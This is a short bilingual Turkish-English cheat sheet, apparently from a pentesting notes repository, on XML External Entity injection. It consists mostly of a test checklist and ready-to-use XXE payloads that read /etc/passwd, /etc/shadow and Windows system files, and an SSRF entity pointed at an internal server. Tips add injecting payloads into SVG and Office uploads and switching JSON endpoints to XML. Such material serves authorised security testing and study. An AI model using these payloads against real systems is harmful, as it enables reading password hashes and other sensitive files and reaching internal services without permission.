# 📄 XXE Injection (XML External Entity)

## 🇹🇷 Türkçe

### Kontrol Listesi

| # | Test | Açıklama | Durum |
|---|------|----------|-------|
| 1 | Basic XXE | `/etc/passwd` okuma | ⬜ |
| 2 | Blind XXE | Dış sunucuya ping | ⬜ |
| 3 | Parameter Entities | DTD bypass | ⬜ |
| 4 | XInclude | `xi:include` ile dosya okuma | ⬜ |
| 5 | JSON to XML | Content-Type değiştirme | ⬜ |

### Temel Payloadlar

**Dosya Okuma (Linux):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
```

**Dosya Okuma (Windows):**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini"> ]>
<root>&xxe;</root>
```

**SSRF via XXE:**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://internal-server:80/"> ]>
```

**JSON Endpoint'e XML Gönderme:**
Eğer bir API JSON bekliyorsa, `Content-Type: application/xml` yapıp XML göndermeyi dene. Bazı parser'lar XML de kabul eder.

---

## 🇬🇧 English

### Checklist

| # | Test | Description | Status |
|---|------|-------------|--------|
| 1 | Basic XXE | Read local files | ⬜ |
| 2 | Blind XXE | Out-of-band extraction | ⬜ |
| 3 | Parameter Entities | DTD bypass | ⬜ |
| 4 | XInclude | `xi:include` attack | ⬜ |
| 5 | JSON to XML | Content-Type swapping | ⬜ |

### Quick Payloads

```xml
<!-- Basic LFI -->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/shadow"> ]>
<userInfo>
 <firstName>John</firstName>
 <lastName>&ent;</lastName>
</userInfo>
```

### Tips

1.  **Test Uploads:** SVG, DOCX, XLSX, PPTX files are XML-based. Inject payload in them.
2.  **Blind XXE:** Use out-of-band (OOB) techniques if response is hidden.

---

[← Back to README](../README.md)
